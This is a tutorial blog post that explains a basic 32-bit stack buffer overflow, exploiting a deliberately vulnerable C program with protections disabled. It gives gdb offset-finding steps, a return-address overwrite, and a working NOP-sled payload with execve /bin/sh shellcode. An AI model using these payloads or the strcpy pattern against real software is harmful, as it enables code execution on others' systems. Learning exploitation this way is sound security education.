---
layout: post
title:  "Exploit a basic buffer overflow"
date:   2018-10-15 09:00:00
tags: Development
author: Antoine Brunet
permalink: exploit-basic-buffer-overflow.html
comments: true
description: "Understanding buffer overflow code injection through a basic example"
keywords: "buffer overflow, gdb, proof of concept, shellcode"
---

# Introduction

This document will be an overview of a very basic buffer overflow.
We will see the exploitation of a vulnerable program compile in 32 bits on an x86 architecture.

A buffer overflow is a bug that appears when a process writes in a memory buffer (stack or heap) and exceeds the allocated memory, overwriting some information used by the process. When this bug appears non intentionally, the computer comportment is unpredictable, most of the time this results as a seg fault error.
If the bug is exploited, it can permit attacker to inject some code.

Throughout the years, security has been improved to prevent this type of bug as much as possible. To block them, the developers have modifies the kernel with the implementation of the ASLR (Address Space Layout Randomization) and the openwall patch. The compiler is also modified by adding the canary. For this article all security will be disabled.

There are other ways to exploit a buffer overflow like the ret into libc, or ROP. Those techniques will not be explained in this article.

# Few reminders

When a program is executed, it is transformed to a process image by the program loader and a virtual memory space is allowed in RAM. The program loader will map all the loadable segment of the binary and the needed library with the system call, mmap(). This virtual space is divided into two spaces, user and kernel space. The user space cannot access kernel space, but the kernel space can access user space. So in our case we will abuse the user space.

Register we need to know for the exploitation:
- EIP (RIP for 64 bits) which correspond to the instruction pointer, this one contain the address of the next instruction to execute.
- ESP (RSP for 64 bits) which correspond to the top stack pointer, it permit to see the element we insert on the stack.

# The vulnerable program

## Source code

```c
#include<stdio.h>
#include<string.h>

void crackMeMaybe();
void callMeMaybe();

int main(int argc, char* argv[]) {
    if (argc == 2){
        crackMeMaybe(argv[1]);
    } else {
        printf("You must specify an argument\n");
	}
}

/*
   The crackMeMaybe function is vulnerable to a buffer overflow.
   The use of strcpy is prohibited, you must use strncpy.
*/
void crackMeMaybe(const char* arg){
    char buffer[128];
    strcpy(buffer, arg);               // Vulnerable function
    printf("Message: %s\n", buffer);
}

/*
   This function is never call in our program, let's try to call
   it using the buffer overflow vulnerability.
*/
void callMeMaybe(){
	printf("Pwned !!\n");
}
```

## Compilation and security deactivation

We deactivate the Address Space Layout Randomization (ASLR).

```sh
$ echo 0 > /proc/sys/kernel/randomize_va_space
```

We compile the program with this Makefile without the GCC compilers security.

```sh
V=vuln.c

EXEC_V_32=crackme-32

all:
    gcc -m32 -g -z execstack -fno-stack-protector ./$(V) -o $(EXEC_V_32)

clean:
	rm -rf $(EXEC_V_32) peda-session-$(EXEC_V_32).txt
```

Without these securities the stack is executable, we remove the canary, and the ASLR is deactivate.

# Exploitation

First we will check for the different functions on the executable and how they are mapped in memory with `objdump` or `nm`.

```sh
$ objdump -x crackme-32
ou
$ nm crackme-32
```

Now we can launch `gdb` (I use it with [peda](https://github.com/longld/peda)) to get the information we need to exploit our crackme program.

```sh
$ gdb
gdb$ file crackme-32
gdb$ run messageDeTest
Message: messageDeTest
gdb$ run $(python -c 'print "A" * 200')
```

With this argument the program seg fault. The memory buffer has been filled and exceed.
As we can see in the code above the buffer has a 128 bytes size.
Now we need to find the offset for overwriting the EIP register.

```sh
gdb$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AA.....AAxAAyA'
```

This command is a `peda` command that permits to generate a specific pattern that will help us find the offset.

So let's run the program with this pattern.

```sh
run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AA.....AAxAAyA'
 [----------------------------------registers-----------------------------------]
EAX: 0xd2
EBX: 0xf7fb9000 --> 0x1a8da8
ECX: 0x0
EDX: 0xf7fba878 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x41514141 ('AAQA')
ESP: 0xffffd250 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EIP: 0x41416d41 ('AmAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
```
We can see that the EIP register has been overwritten with the pattern `AmAA`, let's find the exact offset with this command.

```sh
gdb-peda$ pattern offset AmAA
AmAA found at offset: 140
```

We have a 140 offset. So we know that we have to pass 140 octets before putting the address of the callMeMaybe function.

The callMeMaybe address is :

```sh
gdb-peda$ p callMeMaybe
$1 = {void ()} 0x80484c6 <callMeMaybe>
```

We now have everything we need to execute this command through the buffer overflow vulnerability.
For call the function `callMeMaybe`, it is necessary to run the program with an offset of 140 followed by the address of the function in little endian (`0x80484c6` =>  `0xc6840408`).

```sh
gdb-peda$ run $(python -c 'print "A" * 140 + "\xc6\x84\x04\x08"')
```

Great, we just got owned ;), we get the message `Pwned !!`.

## Shellcode execution

The Shellcode is a program composed of hexadecimal commands.

Before, we found the offset (140), we dispose of a 23 bytes shellcode which correspond to the `/bin/dash` command.
Now we need to find the address of our buffer. We can use `gdb` to get it, the `A` character equal to `0x41` in hexadecimal. Let's pass in argument two hundred `A` and check the ESP register to find them.

```sh
gdb$ run $(python -c 'print "A" *200')
gdb$ x/100xg $esp
0xffffd490:	0x622f73746e656d75	0x65764f7265666675
0xffffd4a0:	0x65642f776f6c6672	0x336f6d65642f6f6d
0xffffd4b0:	0x410032332d31762f	0x4141414141414141
0xffffd4c0:	0x4141414141414141	0x4141414141414141
0xffffd4d0:	0x4141414141414141	0x4141414141414141
0xffffd4e0:	0x4141414141414141	0x4141414141414141
0xffffd4f0:	0x4141414141414141	0x4141414141414141
0xffffd500:	0x4141414141414141	0x4141414141414141
0xffffd510:	0x4141414141414141	0x4141414141414141
0xffffd520:	0x4141414141414141	0x4141414141414141
0xffffd530:	0x4141414141414141	0x4141414141414141
0xffffd540:	0x4141414141414141	0x4141414141414141
0xffffd550:	0x4141414141414141	0x4141414141414141
0xffffd560:	0x4141414141414141	0x4141414141414141
0xffffd570:	0x4141414141414141	0x0041414141414141
0xffffd580:	0x524e54565f474458	0x544942524f00373d
0xffffd590:	0x4454454b434f535f	0x2f706d742f3d5249
0xffffd5a0:	0x72672d746962726f	0x535f474458006d61
```

We can estimate that the buffer address is between `0xffffd4c0` and `0xffffd570`. Attention, the `gdb` address can be a bit different than when the program is running outside of it. To avoid this problem we will take an address in the middle of our buffer, for example `0xffffd510`, it is not important to target the exact buffer address because we will use a NOP sled.

We now need a shellcode. You can write it yourself or you can find one that fits your needs on [shell-strom](http://shell-storm.org/shellcode/files/shellcode-827.php).

We now have all we need, we will start by inserting some x90 instructions in the buffer. The x90 instruction is called a NOP, it corresponds to a single clock time for the processor. So if the program executes those instructions it will not do anything until it arrives to our shellcode, it is called a NOP sled. We now put our shellcode just after the NOP sled, and we complete the offset with some padding to arrive to the 140 bytes. Finally we put the buffer address we took just before (`0xffffd510`), do not forget to put it in little endian.

So it should look like this: 100 bytes (NOP sled) + 23 bytes (shellcode) + 17 (padding) + the buffer address in little endian.

```sh
gdb$ run $(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 17 + "\x10\xd5\xff\xff"')
```

We still on `gdb` so we get a shell but we do not have the possibility to use it.
So let's redo this command out of `gdb`.

```sh
$ ./crackme-32 $(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90" * 17 + "\x10\xd5\xff\xff"')
```

Here we go!! We got a shell.

<br>
![](https://media.makeameme.org/created/sounds-like-someone-5ab911.jpg){:class="img-responsive"}